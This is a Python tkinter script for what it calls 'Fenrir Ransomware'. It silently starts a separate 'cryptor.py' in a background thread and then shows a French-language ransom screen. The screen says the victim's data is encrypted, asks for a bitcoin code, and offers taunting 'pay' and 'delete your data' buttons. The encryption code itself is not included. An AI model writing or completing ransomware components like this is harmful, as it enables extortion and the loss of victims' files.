#!/usr/bin/env python
# -*- coding: utf-8 -*-

from tkinter import *
from tkinter.messagebox import *
from tkinter.ttk import Label
import os
import sys
import time
from threading import Thread
import webbrowser

class MyThread(Thread):
    def run(self):
        os.system('cryptor.py')
        pass

thread = MyThread()
thread.daemon = True
thread.start()

def htmlfile():
    webbrowser.open_new_tab('help.html')

#time.sleep(3)

fenrir = Tk()
fenrir.title("Fenrir Ransomware")

# Alertbar
menubar = Menu(fenrir)
menu1 = Menu(menubar, tearoff=0)
menu1.add_command(label="Français")
menu1.add_command(label="English")
menubar.add_cascade(label="Langue/language", menu=menu1)
fenrir.config(menu=menubar)


Oups = Frame(fenrir, borderwidth=5, relief=GROOVE, bg="red")
Oups.pack(side=TOP, padx=30, pady=30)
infos = Frame(fenrir, borderwidth=0, relief=GROOVE, bg="#F0F0F0")
infos.pack(padx=30, pady=30)

Label(Oups, text="Woops ! Vos données ont été encryptées par Fenrir !", background="red", foreground="black", font="50").pack(side=TOP, padx=10, pady=10)
Label(infos, text="Comment récupérer mes données ?", background="#F0F0F0", foreground="black", font="10").pack(side=TOP, padx=10, pady=10)

canvas = Canvas(fenrir, width=500, height=200, bg='#F0F0F0')
infos2 = Button(infos, text="Ouvrir l'aide", command=htmlfile, borderwidth=2, bg="white", fg="black").pack(side=TOP, padx=5, pady=5)
canvas.pack()


string = StringVar()
string.set("Le code bitcoin")
entree = Entry(fenrir, textvariable=string, width=30, bg="black", fg="white")
entree.pack(side=LEFT)

def callback1():
    showerror("Vous n'avez pas payé !", "Vous n'avez pas payé les bitcoins...")
Button(fenrir, text='Payer pour récupérer vos données', command=callback1, bg='red', fg='white').pack(side=LEFT, padx=5, pady=5)
def callback2():
    if askyesno('Supprimer les données', 'Êtes-vous sûr de vouloir supprimer vos données ?'):
        showwarning('Et bien adieu.', 'Tant pis...')
        showwarning('££ùp,!;', 'Vos données vont être supprimées dans quelques secondes.')
    else:
        showerror("Ah...", "Vous avez peur ? C'est ça ?")
Button(fenrir, text='Supprimer vos données', command=callback2, bg='red', fg='white').pack(side=RIGHT, padx=5, pady=5)



fenrir.withdraw()
fenrir.update_idletasks()
x = (fenrir.winfo_screenwidth() - fenrir.winfo_reqwidth()) / 2
y = (fenrir.winfo_screenheight() - fenrir.winfo_reqheight()) / 2
fenrir.geometry("+%d+%d" % (x, y))
fenrir.deiconify()
fenrir.mainloop()

fenrir.mainloop()
